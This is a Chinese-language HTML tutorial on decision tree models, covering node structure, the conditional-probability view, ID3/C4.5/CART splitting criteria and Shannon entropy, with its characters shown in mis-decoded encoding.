<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9ee0fa944ee48b5bb114fe9d821395d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=ZEBHe%2BY%2FjDYMa9KnT9VmrCIVFgA%3D" alt="å¤§æ•°æ®-199 å†³ç­–æ ‘æ¨¡å‹è¯¦è§£ï¼šèŠ‚ç‚¹ç»“æ„ã€æ¡ä»¶æ¦‚ç‡è§†è§’ä¸é¦™å†œç†µè®¡ç®—" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7b01efec5cc4c4799113b01fa99fffa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=Irols8ymz6dRnmGyMMa9J%2Fp%2BmXA%3D" alt="å¤§æ•°æ®-199 å†³ç­–æ ‘æ¨¡å‹è¯¦è§£ï¼šèŠ‚ç‚¹ç»“æ„ã€æ¡ä»¶æ¦‚ç‡è§†è§’ä¸é¦™å†œç†µè®¡ç®—" loading="lazy"/></p>
<h2 data-id="heading-1">å†³ç­–æ ‘æ¨¡å‹</h2>
<ul>
<li>æ ‘æ¨¡å‹æ˜¯æœ‰ç›‘ç£å­¦ä¹ ç±»ç®—æ³•ä¸­åº”ç”¨å¹¿æ³›çš„ä¸€ç±»æ¨¡å‹ï¼ŒåŒæ—¶å¯åº”ç”¨ä¸åˆ†ç±»é—®é¢˜å’Œå›å½’é—®é¢˜ï¼Œå…¶ä¸­ç”¨äºè§£å†³åˆ†ç±»é—®é¢˜çš„æ ‘æ¨¡å‹å¸¸è¢«ç§°ä¸ºåˆ†ç±»æ ‘ï¼Œè€Œç”¨äºè§£å†³å›å½’ç±»é—®é¢˜çš„æ ‘æ¨¡å‹è¢«ç§°ä¸ºå›å½’æ ‘ã€‚</li>
<li>æ ‘æ¨¡å‹é€šè¿‡é€’å½’å¼åˆ‡å‰²çš„æ–¹æ³•æ¥å¯»æ‰¾æœ€ä½³åˆ†ç±»æ ‡å‡†ï¼Œè¿›è€Œæœ€ç»ˆå½¢æˆè§„åˆ™ã€‚</li>
<li>å…¶ç®—æ³•åŸç†è™½ç„¶ç®€å•ï¼Œä½†æ¨¡å‹æœ¬èº«ä½¿ç”¨é¢æå¹¿ï¼Œä¸”åœ¨åˆ†ç±»é—®é¢˜å’Œå›å½’é—®é¢˜ä¸Šå‡æœ‰è‰¯å¥½çš„è¡¨ç°ï¼Œå¤–åŠ ä½¿ç”¨ç®€å•ï¼Œæ— éœ€äººä¸ºè¿›è¡Œè¿‡å¤šå˜é‡è°ƒæ•´å’Œæ•°æ®é¢„å¤„ç†ï¼ŒåŒæ—¶ç”Ÿæˆè§„åˆ™æ¸…æ™°ï¼Œæ¨¡å‹æœ¬èº«å¯è§£é‡Šæ€§éå¸¸å¼ºï¼Œå› æ­¤åœ¨å„ä¸ªè¡Œä¸šå‡æœ‰å¹¿æ³›åº”ç”¨ã€‚</li>
<li>å†³ç­–æ ‘ï¼ˆDecision Treeï¼‰æ˜¯ä¸€ç§å®ç°åˆ†æ²»ç­–ç•¥çš„å±‚æ¬¡æ•°æ®ç»“æ„ï¼Œå®ƒæ˜¯ä¸€ç§æœ‰æ•ˆçš„éå‚æ•°å­¦ä¹ æ–¹æ³•ï¼Œå¹¶å¯ä»¥ç”¨äºåˆ†ç±»å’Œå›å½’ï¼Œæˆ‘ä»¬ä¸»è¦è®¨è®ºåˆ†ç±»çš„å†³ç­–æ ‘ã€‚</li>
<li>åˆ†ç±»å†³ç­–æ ‘æ¨¡å‹è¡¨ç¤ºä¸€ç§åŸºäºç‰¹å¾å¯¹å®ä¾‹è¿›è¡Œåˆ†ç±»çš„å±æ€§ç»“æ„ï¼ˆåŒ…æ‹¬äºŒå‰æ ‘å’Œå¤šå‰æ ‘ï¼‰ã€‚</li>
</ul>
<p>å†³ç­–æ ‘ç”±èŠ‚ç‚¹ï¼ˆNodeï¼‰å’Œæœ‰å‘è¾¹ï¼ˆDirected edgeï¼‰ç»„æˆï¼Œæ ‘ä¸­åŒ…å«ä¸‰ç§èŠ‚ç‚¹ï¼š</p>
<ul>
<li>æ ¹èŠ‚ç‚¹ï¼ˆRoot Nodeï¼‰ï¼šåŒ…å«æ ·æœ¬å…¨é›†ï¼Œæ²¡æœ‰å…¥è¾¹ï¼Œä½†æœ‰é›¶æ¡æˆ–å¤šæ¡å¤šè¾¹ã€‚</li>
<li>å†…éƒ¨èŠ‚ç‚¹ï¼ˆInternal Nodeï¼‰ï¼šå¯¹åº”äºå±æ€§æµ‹è¯•æ¡ä»¶ï¼Œæ°æœ‰ä¸€æ¡å…¥è¾¹ï¼Œå’Œä¸¤æ¡æˆ–å¤šæ¡å‡ºè¾¹ã€‚</li>
<li>å¶èŠ‚ç‚¹ï¼ˆLeaf Nodeï¼‰æˆ–ç»ˆèŠ‚ç‚¹ï¼ˆTerminal Nodeï¼‰ï¼šå¯¹åº”äºå†³ç­–ç»“æœï¼Œæ°æœ‰ä¸€æ¡å…¥è¾¹ï¼Œä½†æ²¡æœ‰å‡ºè¾¹ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d31d2ba663cf423a811ac4756a20cc8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=NOSu7FpCWIH8ZYvrHrF4LMx%2FV7s%3D" alt="å†³ç­–æ ‘èŠ‚ç‚¹" loading="lazy"/></p>
<h2 data-id="heading-2">å†³ç­–æ ‘åŸºæœ¬æµç¨‹</h2>
<p>ä»æ ¹èŠ‚ç‚¹åˆ°æ¯ä¸ªå¶å­èŠ‚ç‚¹çš„è·¯å¾„å¯¹åº”äº†ä¸€ä¸ªåˆ¤å®šæµ‹è¯•åºåˆ—ï¼Œå…¶åŸºæœ¬æµç¨‹éµå¾ªäº†ç®€å•ä¸”ç›´è§‚çš„â€œåˆ†è€Œæ²»ä¹‹â€ç­–ç•¥ã€‚
ç”±æ­¤ï¼Œå±€éƒ¨åŒºåŸŸé€šè¿‡å°‘æ•°å‡ æ­¥é€’å½’åˆ†è£‚ç¡®å®šï¼Œæ¯ä¸ªå†³ç­–èŠ‚ç‚¹å®ç°ä¸€ä¸ªå…·æœ‰ç¦»æ•£è¾“å‡ºçš„å±æ€§æµ‹è¯•å‡½æ•°ï¼Œæ ‡è®°åˆ†æ”¯ã€‚
å‡è®¾ç»™å®šè®­ç»ƒé›†è¾“å…¥ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1368846751c64a81b1e90965d3d4c815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=V6CH2GCOJH2b8%2ByzAPxMvb2%2FNHM%3D" alt="å†³ç­–æ ‘åŸºæœ¬æµç¨‹" loading="lazy"/>
åœ¨æ¯ä¸ªèŠ‚ç‚¹åº”ç”¨ä¸€ä¸ªæµ‹è¯•ï¼Œå¹¶æ ¹æ®æµ‹è¯•çš„è¾“å‡ºç¡®å®šä¸€ä¸ªåˆ†æ”¯ï¼Œè¿™ä¸€è¿‡ç¨‹ä»è·ŸèŠ‚ç‚¹å¼€å§‹ï¼Œå¹¶é€’å½’çš„é‡å¤ï¼Œç›´è‡³åˆ°è¾¾ä¸€ä¸ªå¶å­èŠ‚ç‚¹ï¼Œè¿™æ˜¯ï¼Œè¯¥ leaf çš„å€¼å½¢æˆè¾“å‡ºã€‚</p>
<h2 data-id="heading-3">å†³ç­–ä¸æ¡ä»¶æ¦‚ç‡åˆ†å¸ƒ</h2>
<p>å†³ç­–æ ‘æ˜¯ä¸€ç§åŸºäºæ¦‚ç‡ç»Ÿè®¡çš„æœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œå…¶æœ¬è´¨å¯ä»¥ç†è§£ä¸ºåœ¨ç»™å®šå†³ç­–èŠ‚ç‚¹ä¸‹å¯¹ç±»åˆ«å˜é‡çš„æ¡ä»¶æ¦‚ç‡åˆ†å¸ƒå»ºæ¨¡ã€‚å…·ä½“æ¥è¯´ï¼š</p>
<ol>
<li>æ¦‚ç‡åˆ†å¸ƒçš„å®šä¹‰ä¸åˆ’åˆ†ï¼š</li>
</ol>
<ul>
<li>å†³ç­–æ ‘å°†ç‰¹å¾ç©ºé—´ X åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªäº’ä¸é‡å çš„åŒºåŸŸ R1, R2,..., Rm</li>
<li>åœ¨æ¯ä¸ªåŒºåŸŸ Rj ä¸Šå®šä¹‰äº†ä¸€ä¸ªæ¡ä»¶æ¦‚ç‡åˆ†å¸ƒ P(Y|X âˆˆ Rj)</li>
<li>è¿™ä¸ªæ¦‚ç‡åˆ†å¸ƒå®šä¹‰åœ¨ç±»åˆ«å˜é‡ Y çš„æ‰€æœ‰å¯èƒ½å–å€¼ä¸Š</li>
</ul>
<ol start="2">
<li>æ ‘ç»“æ„çš„æ¦‚ç‡è§£é‡Šï¼š</li>
</ol>
<ul>
<li>æ ¹èŠ‚ç‚¹å¯¹åº”æ•´ä¸ªç‰¹å¾ç©ºé—´çš„åˆå§‹åˆ’åˆ†</li>
<li>æ¯ä¸ªå†…éƒ¨å†³ç­–èŠ‚ç‚¹ä»£è¡¨å¯¹å½“å‰åŒºåŸŸçš„è¿›ä¸€æ­¥ç»†åˆ†</li>
<li>éšç€ä»æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹çš„è·¯å¾„å»¶ä¼¸ï¼Œç‰¹å¾ç©ºé—´è¢«é€’å½’åœ°åˆ’åˆ†ä¸ºæ›´å°çš„å­åŒºåŸŸ</li>
<li>æœ€ç»ˆæ¯ä¸ªå¶èŠ‚ç‚¹å¯¹åº”ç‰¹å¾ç©ºé—´çš„ä¸€ä¸ªç‰¹å®šåŒºåŸŸ Rj</li>
</ul>
<ol start="3">
<li>æ¡ä»¶æ¦‚ç‡çš„ç‰¹æ€§ï¼š</li>
</ol>
<ul>
<li>åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ç»Ÿè®¡è½å…¥æ¯ä¸ªåŒºåŸŸçš„æ ·æœ¬ç±»åˆ«åˆ†å¸ƒæ¥ä¼°è®¡ P(Y|X âˆˆ Rj)</li>
<li>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¶èŠ‚ç‚¹ä¸Šçš„æ¡ä»¶æ¦‚ç‡ä¼šå‘ˆç°æ˜æ˜¾åå‘æ€§ï¼Œå³æŸä¸ªç±»åˆ«çš„æ¦‚ç‡æ˜¾è‘—é«˜äºå…¶ä»–ç±»åˆ«</li>
<li>ä¾‹å¦‚ï¼Œåœ¨äºŒåˆ†ç±»é—®é¢˜ä¸­ï¼ŒæŸä¸ªå¶èŠ‚ç‚¹å¯èƒ½å¾—åˆ° P(Y=1|X âˆˆ Rj)=0.85ï¼ŒP(Y=0|X âˆˆ Rj)=0.15</li>
</ul>
<ol start="4">
<li>åˆ†ç±»å†³ç­–è¿‡ç¨‹ï¼š</li>
</ol>
<ul>
<li>å¯¹äºæ–°æ ·æœ¬ xï¼Œå†³ç­–æ ‘ä¼šå°†å…¶è·¯ç”±åˆ°å¯¹åº”çš„å¶èŠ‚ç‚¹ï¼ˆåŒºåŸŸ Rjï¼‰</li>
<li>æ ¹æ®è¯¥èŠ‚ç‚¹çš„æ¡ä»¶æ¦‚ç‡åˆ†å¸ƒï¼Œé‡‡ç”¨æœ€å¤§åéªŒæ¦‚ç‡(MAP)å‡†åˆ™è¿›è¡Œåˆ†ç±»ï¼š
yÌ‚ = argmax_y P(Y=y|X âˆˆ Rj)</li>
<li>è¿™æ„å‘³ç€å³ä½¿æŸä¸ªç±»åˆ«çš„æ¦‚ç‡ä¸æ˜¯100%ï¼Œå†³ç­–æ ‘ä»ä¼šå°†è¯¥æ ·æœ¬å¼ºè¡Œåˆ’åˆ†åˆ°æ¦‚ç‡æœ€å¤§çš„ç±»åˆ«</li>
</ul>
<ol start="5">
<li>å®é™…åº”ç”¨ç¤ºä¾‹ï¼š</li>
</ol>
<ul>
<li>åœ¨ä¿¡ç”¨è¯„åˆ†æ¨¡å‹ä¸­ï¼Œå†³ç­–æ ‘å¯èƒ½å°†"å¹´æ”¶å…¥&gt;50ä¸‡ä¸”è´Ÿå€ºç‡&lt;30%"çš„åŒºåŸŸåˆ†é…ç»™"ä½é£é™©"ç±»åˆ«ï¼Œæ¦‚ç‡ä¸º92%</li>
<li>åœ¨åŒ»ç–—è¯Šæ–­ä¸­ï¼ŒæŸä¸ªå¶èŠ‚ç‚¹å¯èƒ½è¡¨ç¤º"ä½“æ¸©&gt;38.5â„ƒä¸”ç™½ç»†èƒè®¡æ•°&gt;10^4"æ¡ä»¶ä¸‹ï¼Œæ‚£ç»†èŒæ€§è‚ºç‚çš„æ¦‚ç‡ä¸º78%</li>
</ul>
<p>è¿™ç§æ¦‚ç‡è§£é‡Šæ¡†æ¶ä¸ºç†è§£å†³ç­–æ ‘çš„å·¥ä½œåŸç†æä¾›äº†ç†è®ºåŸºç¡€ï¼Œä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå†³ç­–æ ‘å®¹æ˜“åœ¨è®­ç»ƒæ•°æ®ä¸Šè¾¾åˆ°100%å‡†ç¡®ç‡ï¼ˆé€šè¿‡ä¸æ–­ç»†åˆ†ç›´åˆ°æ¯ä¸ªå¶èŠ‚ç‚¹åªåŒ…å«å•ä¸€ç±»åˆ«çš„æ ·æœ¬ï¼‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35fcbf6c03b34c5e9f5b15fa75e8dc5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=yIrZGocUfrVJ0G%2BRtE%2BKtfwETmg%3D" alt="å†³ç­–æ ‘åˆ†å¸ƒ" loading="lazy"/>
å·¦å›¾è¡¨ç¤ºäº†ç‰¹å¾ç©ºé—´çš„ä¸€ä¸ªåˆ’åˆ†ï¼Œå‡å®šç°åœ¨åªæœ‰ W10 å’Œ W20 ä¸¤ä¸ªå†³ç­–ç‚¹ï¼Œç‰¹å¾ç©ºé—´è¢«å†³ç­–ç‚¹æ²¿è½´åˆ’åˆ†ï¼Œå¹¶ä¸”ç›¸ç»§åˆ’åˆ†ç›¸äº’æ­£äº¤ï¼Œæ¯ä¸ªå°çŸ©å½¢è¡¨ç¤ºä¸€ä¸ªåŒºåŸŸï¼Œç‰¹å¾ç©ºé—´ä¸Šçš„åŒºåŸŸæ„æˆäº†é›†åˆï¼ŒX å–å€¼ä¸ºåŒºåŸŸçš„é›†åˆã€‚
æˆ‘ä»¬åœ¨è¿™é‡Œåªå‡è®¾ä¸¤ç±»ï¼Œå³ Y çš„å–å€¼ä¸º æ–¹å—ã€åœ†åœˆã€‚å½“æŸä¸ªåŒºåŸŸ C çš„æ¡ä»¶æ¦‚ç‡åˆ†å¸ƒæ»¡è¶³ Pï¼ˆY=åœ†åœˆï½œX=Cï¼‰&gt; 0.5 æ—¶ï¼Œåˆ™è®¤ä¸ºè¿™ä¸ªåŒºåŸŸå±äºåœ†åœˆç±»ï¼Œå³è½åœ¨è¿™ä¸ªåŒºåŸŸçš„å®ä¾‹éƒ½è¢«è§†ä¸ºè¯¥ç±»ã€‚
å³å›¾ä¸ºå¯¹åº”äºæ¦‚ç‡åˆ†å¸ƒçš„å†³ç­–æ ‘ï¼Œå¦‚æœè¾“å…¥ç»´æ˜¯ Xn æ˜¯ç¦»æ•£çš„ï¼Œå– N ä¸ªå¯èƒ½çš„å€¼ä¹‹ä¸€ï¼Œåˆ™è¯¥å†³ç­–èŠ‚ç‚¹æ£€æŸ¥ Xn çš„å€¼ï¼Œå¹¶å–ç›¸åº”åˆ†æ”¯ï¼Œå®ç°ä¸€ä¸ª n è·¯åˆ’åˆ†ã€‚å› æ­¤ï¼Œå¦‚æœå†³ç­–èŠ‚ç‚¹å…·æœ‰ç¦»æ•£åˆ†æ”¯ï¼Œæ•°å€¼è¾“å…¥åº”å½“ç¦»æ•£åŒ–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95fd881905594d24b20cf7ac193c1130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=qc6ppc%2FRqhE2IudFy6ELg7Im6f8%3D" alt="å…¬å¼çš„è§£é‡Š" loading="lazy"/></p>
<h2 data-id="heading-4">å­¦ä¹ ç®—æ³•</h2>
<p>å†³ç­–æ ‘å­¦ä¹ æ˜¯ä¸€ç§é€šè¿‡å½’çº³è®­ç»ƒæ•°æ®é›†æ¥æ„å»ºåˆ†ç±»è§„åˆ™çš„æœºå™¨å­¦ä¹ æ–¹æ³•ï¼Œä¹Ÿç§°ä¸º"æ ‘å½’çº³"è¿‡ç¨‹ã€‚è¿™ä¸€è¿‡ç¨‹å…·æœ‰ä»¥ä¸‹å‡ ä¸ªå…³é”®ç‰¹å¾ï¼š</p>
<ol>
<li>æ¨¡å‹é€‰æ‹©åŸåˆ™</li>
</ol>
<ul>
<li>å¯¹äºåŒä¸€ä¸ªè®­ç»ƒæ•°æ®é›†ï¼Œå¯èƒ½å­˜åœ¨æ— æ•°æ£µèƒ½å¤Ÿå®Œç¾åˆ†ç±»çš„å†³ç­–æ ‘ã€‚æˆ‘ä»¬è¿½æ±‚çš„æ˜¯å…¶ä¸­"æœ€å°"çš„æ ‘ï¼Œè¿™é‡Œçš„"æœ€å°"é€šå¸¸é€šè¿‡ä¸¤ç§æ–¹å¼è¡¡é‡ï¼š
<ul>
<li>æ ‘çš„èŠ‚ç‚¹æ€»æ•°ï¼ˆåŒ…æ‹¬å†…éƒ¨èŠ‚ç‚¹å’Œå¶èŠ‚ç‚¹ï¼‰</li>
<li>å†³ç­–èŠ‚ç‚¹çš„å¤æ‚æ€§ï¼ˆå¦‚åˆ’åˆ†æ¡ä»¶çš„å¤æ‚ç¨‹åº¦ï¼‰</li>
</ul>
</li>
<li>ä»æ¦‚ç‡è§’åº¦è§£é‡Šï¼Œå†³ç­–æ ‘å®é™…ä¸Šæ˜¯åœ¨ä¼°è®¡æ¡ä»¶æ¦‚ç‡æ¨¡å‹ã€‚åœ¨ç‰¹å¾ç©ºé—´åˆ’åˆ†ä¸‹ï¼Œå­˜åœ¨æ— æ•°ä¸ªå¯èƒ½çš„æ¡ä»¶æ¦‚ç‡æ¨¡å‹ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ ‡å‡†æ˜¯ï¼š
<ul>
<li>å¯¹è®­ç»ƒæ•°æ®å…·æœ‰è‰¯å¥½çš„æ‹Ÿåˆåº¦</li>
<li>åŒæ—¶å…·å¤‡è‰¯å¥½çš„æ³›åŒ–èƒ½åŠ›ï¼ˆå¯¹æœªçŸ¥æ•°æ®çš„é¢„æµ‹å‡†ç¡®æ€§ï¼‰</li>
</ul>
</li>
</ul>
<ol start="2">
<li>ç®—æ³•æ‰§è¡Œè¿‡ç¨‹</li>
</ol>
<ul>
<li>ç®—æ³•å¼€å§‹æ—¶ï¼Œæ•´ä¸ªè®­ç»ƒæ•°æ®é›†ä½äºæ ¹èŠ‚ç‚¹</li>
<li>åœ¨æ¯ä¸ªåˆ’åˆ†æ­¥éª¤ä¸­ï¼Œç®—æ³•ä¼šï¼š
<ul>
<li>å¯¹äºè¿ç»­å€¼å±æ€§ï¼šå¯»æ‰¾æœ€ä¼˜åˆ†å‰²ç‚¹å°†æ•°æ®åˆ’åˆ†ä¸ºä¸¤ä¸ªå­é›†</li>
<li>å¯¹äºç¦»æ•£å€¼å±æ€§ï¼šæ ¹æ®å±æ€§å€¼å°†æ•°æ®åˆ’åˆ†ä¸ºNä¸ªå­é›†ï¼ˆNä¸ºå±æ€§å–å€¼ä¸ªæ•°ï¼‰</li>
</ul>
</li>
<li>åˆ’åˆ†æ ‡å‡†é€šå¸¸åŸºäºï¼š
<ul>
<li>ä¿¡æ¯å¢ç›Šï¼ˆID3ç®—æ³•ï¼‰</li>
<li>ä¿¡æ¯å¢ç›Šæ¯”ï¼ˆC4.5ç®—æ³•ï¼‰</li>
<li>åŸºå°¼æŒ‡æ•°ï¼ˆCARTç®—æ³•ï¼‰</li>
</ul>
</li>
<li>é€’å½’åœ°å¯¹æ¯ä¸ªå­é›†é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°æ»¡è¶³ä»¥ä¸‹ä»»ä¸€åœæ­¢æ¡ä»¶ï¼š
<ul>
<li>å½“å‰å­é›†ä¸­çš„æ ·æœ¬åŸºæœ¬å±äºåŒä¸€ç±»åˆ«ï¼ˆå¦‚95%ä»¥ä¸Šï¼‰</li>
<li>æ²¡æœ‰åˆé€‚çš„ç‰¹å¾å¯ä¾›ç»§ç»­åˆ’åˆ†</li>
<li>è¾¾åˆ°é¢„è®¾çš„æ ‘æ·±åº¦é™åˆ¶</li>
</ul>
</li>
<li>å½“åœæ­¢æ¡ä»¶æ»¡è¶³æ—¶ï¼Œåˆ›å»ºå¶èŠ‚ç‚¹å¹¶æ ‡è®°ä¸ºå½“å‰å­é›†ä¸­çš„ä¸»è¦ç±»åˆ«</li>
</ul>
<ol start="3">
<li>å…¸å‹åº”ç”¨åœºæ™¯</li>
</ol>
<ul>
<li>åŒ»ç–—è¯Šæ–­ï¼šæ ¹æ®æ‚£è€…ç—‡çŠ¶åˆ¤æ–­ç–¾ç—…ç±»å‹</li>
<li>ä¿¡ç”¨è¯„ä¼°ï¼šæ ¹æ®å®¢æˆ·ç‰¹å¾é¢„æµ‹è¿˜æ¬¾èƒ½åŠ›</li>
<li>å·¥ä¸šç”Ÿäº§ï¼šæ ¹æ®è®¾å¤‡å‚æ•°åˆ¤æ–­æ•…éšœç±»å‹</li>
</ul>
<p>ç¤ºä¾‹ï¼šåœ¨é¸¢å°¾èŠ±åˆ†ç±»é—®é¢˜ä¸­ï¼Œå†³ç­–æ ‘å¯èƒ½é¦–å…ˆæ ¹æ®èŠ±ç“£é•¿åº¦è¿›è¡Œåˆ’åˆ†ï¼ˆå¦‚&lt;2.45cmä¸ºä¸€ç±»ï¼‰ï¼Œç„¶ååœ¨æ¯ä¸ªå­é›†ä¸­ç»§ç»­æ ¹æ®å…¶ä»–ç‰¹å¾ï¼ˆå¦‚èŠ±ç“£å®½åº¦ã€è¼ç‰‡é•¿åº¦ç­‰ï¼‰è¿›è¡Œç»†åˆ†ï¼Œæœ€ç»ˆå½¢æˆä¸€æ£µèƒ½å¤Ÿå‡†ç¡®åˆ†ç±»ä¸‰ç§é¸¢å°¾èŠ±çš„å†³ç­–æ ‘ã€‚</p>
<p>æ³¨æ„ï¼šå®é™…åº”ç”¨ä¸­é€šå¸¸ä¼šé€šè¿‡å‰ªæ(pre-pruningæˆ–post-pruning)ç­‰æŠ€æœ¯æ¥é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚</p>
<p>ç»¼ä¸Šï¼Œå†³ç­–æ ‘å­¦ä¹ ç®—æ³•åŒ…æ‹¬ç‰¹å¾é€‰æ‹©ã€å†³ç­–æ ‘çš„ç”Ÿæˆä¸å†³ç­–æ ‘çš„å‰ªæã€‚
ç”±äºå†³ç­–æ ‘è¡¨ç¤ºä¸€ä¸ªæ¡ä»¶æ¦‚ç‡çš„åˆ†å¸ƒï¼Œæ‰€ä»¥æ·±æµ…ä¸åŒçš„å†³ç­–æ ‘å¯¹åº”ç€ä¸åŒçš„å¤æ‚åº¦çš„æ¦‚ç‡æ¨¡å‹ï¼Œå…¶ä¸­å†³ç­–æ ‘çš„ç”Ÿæˆåªè€ƒè™‘å±€éƒ¨æœ€ä¼˜ï¼Œç›¸å¯¹çš„ï¼Œå†³ç­–æ ‘çš„å‰ªæåˆ™è€ƒè™‘å…¨å±€æœ€ä¼˜ã€‚</p>
<h2 data-id="heading-5">é¦™å†œç†µçš„è®¡ç®—</h2>
<p>å†³ç­–æ ‘å­¦ä¹ çš„å…³é”®åœ¨å¦‚ä½•é€‰æ‹©æœ€ä¼˜åˆ’åˆ†å±æ€§ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œéšç€åˆ’åˆ†è¿‡ç¨‹ä¸æ–­è¿›è¡Œï¼Œæˆ‘ä»¬å¸Œæœ›å†³ç­–æ ‘çš„åˆ†æ”¯èŠ‚ç‚¹æ‰€åŒ…å«çš„æ ·æœ¬å°½å¯èƒ½å±äºåŒä¸€ç±»åˆ«ï¼Œå³èŠ‚ç‚¹çº¯åº¦ï¼ˆpurityï¼‰è¶Šæ¥è¶Šé«˜ã€‚åœ¨åˆ†ç±»æ ‘ä¸­ï¼Œåˆ’åˆ†çš„ä¼˜åŠ£ç”¨ä¸çº¯åº¦åº¦é‡ï¼ˆimpurity-measureï¼‰å®šé‡åˆ†æã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77151aef344b439bb5720b940772294d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=X5uxPFmOpGOu0IWxzuREsT%2Fn%2FBQ%3D" alt="é¦™å†œç†µçš„è®¡ç®—" loading="lazy"/>
åœ¨ä¿¡æ¯è®ºä¸æ¦‚ç‡ç»Ÿè®¡ä¸­ï¼Œç†µæ˜¯è¡¨ç¤ºéšæœºå˜é‡ä¸ç¡®å®šæ€§çš„åº¦é‡ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„ç†µï¼Œä¹Ÿå«åšé¦™å†œç†µï¼Œè¿™ä¸ªåå­—æ¥æºä¿¡æ¯è®ºä¹‹çˆ¶å…‹åŠ³å¾·Â·é¦™å†œã€‚</p>
<p>ä¸ºäº†è®¡ç®—ç†µï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—æ‰€æœ‰ç±»åˆ«æ‰€æœ‰å¯èƒ½å€¼åŒ…å«çš„ä¿¡æ¯æœŸæœ›å€¼ï¼ˆæ•°å­¦æœŸæœ›ï¼‰ï¼Œå³ä¸Šè¿°å…¬å¼ã€‚å¯¹äºäºŒåˆ†ç±»é—®é¢˜ï¼Œå¦‚æœ p1=1 è€Œ p2 = 0ï¼Œåˆ™å‡ºæ²¹çš„å®ä¾‹éƒ½å±äº Ci ç±»ã€‚
å¦‚æœ p1 = p2 = 0.5ï¼Œç†µä¸º 1ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d32a0f9c96454f5cab1511d27600c503~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=jVinCTbrvt%2BF%2BeqLk18bGVT80xg%3D" alt="é¦™å†œç†µçš„è®¡ç®—" loading="lazy"/>
ä½†æ˜¯ï¼Œç†µå¹¶éæ˜¯å”¯ä¸€å¯èƒ½çš„åº¦é‡ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8c466b801234bb68aa6a4aefb331f0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767673538&amp;x-signature=WiR3V2wKQmZeA8cgEisxjX6rxD0%3D" alt="é¦™å†œç†µçš„è®¡ç®—" loading="lazy"/>
è¿™äº›éƒ½å¯ä»¥æ¨å¹¿åˆ° K &gt; 2 ç±»ï¼Œå¹¶ä¸”ç»™å®šæŸå¤±å‡½æ•°ï¼Œè¯¯åˆ†ç±»è¯¯å·®å¯ä»¥æ¨å¹¿åˆ°æœ€å°é£é™©ã€‚
ä¸‹å›¾æ˜¾ç¤ºäº†äºŒå…ƒåˆ†ç±»é—®é¢˜ä¸çº¯æ€§åº¦é‡å€¼çš„æ¯”è¾ƒï¼Œp è¡¨ç¤ºå±äºå…¶ä¸­ä¸€ä¸ªç±»çš„è®°å½•æ‰€å çš„æ¯”ä¾‹ã€‚ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œä¸‰ç§æ–¹æ³•éƒ½åœ¨ç±»åˆ†å¸ƒå‡è¡¡æ—¶ï¼ˆå³å½“ p=0.5 æ—¶ï¼‰è¾¾åˆ°æœ€å¤§å€¼ï¼Œè€Œå½“æ‰€æœ‰è®°å½•éƒ½å±äºåŒä¸€ä¸ªç±»æ—¶ï¼ˆp=1 æˆ– p=0ï¼‰è¾¾åˆ°æœ€å°å€¼ã€‚</p>
